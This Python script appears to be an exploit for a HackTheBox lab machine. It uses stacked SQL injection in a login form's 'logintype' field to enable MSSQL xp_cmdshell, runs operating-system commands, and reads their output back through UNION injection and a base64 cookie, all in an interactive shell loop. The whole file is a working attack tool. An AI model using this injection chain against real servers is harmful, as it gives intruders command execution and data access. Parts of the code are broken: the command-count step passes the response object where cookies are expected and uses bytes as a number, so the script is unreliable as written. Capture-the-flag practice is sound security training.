#!/usr/bin/python3 

import requests 
import urllib.parse
import base64


class Fighter(object):

    def __init__(self):
        self.url = "http://members.streetfighterclub.htb/old/verify.asp"
        self.proxies = "http://127.0.0.1:8080"
        
        self.enablecmd= '''1;exec sp_configure 'show advanced options',1;\
                reconfigure;\
                exec sp_configure 'xP_CmDsHeLl', 1;\
                reconfigure;\
                '''
        self.createtable = '''1; create table test(ID int identity(1,1) primary key, output varchar(1024));\
        '''

        self.truncate = '''1;truncate table test;\
        '''
        

        self.getcount = '''1 union select 1,2,3,4,(select top 1 ID  from test order by ID desc),6-- -\
        '''

        self.post(self.enablecmd)
        self.post(self.createtable)

    def post(self, payload):
        
        proxies = {'http' : self.proxies} 

        #enquote = urllib.parse.quote(payload);
        data = {
            'username': 'admin',
            'password': 'password',
            'logintype': payload,
            'remember': 'ON',
            'B1': 'LogIn'
        }

        return requests.post(self.url, proxies=proxies, data=data, allow_redirects=False)

    def runcmd(self, cmd):

        self.post(self.truncate)

        payload = '1; insert into test (output) exec xP_CmDsHeLl "%s";-- -' %cmd
        self.post(payload)

        r  =  self.post(self.getcount)
        count = self.decode(r)
       
        for i in range(0, count):
            id = i + 1;
            op = '1 union select 1,2,3,4,(select top 1 output from test where ID = %d),6-- -' %id 
            try:
                r = self.post(op)
                print(self.decode(r.cookies))
            except:
                pass

    def decode(self,cookies):
        return base64.b64decode(urllib.parse.unquote(cookies['Email']))

o = Fighter()

while True:
    cmd = input(">")
    o.runcmd(cmd)

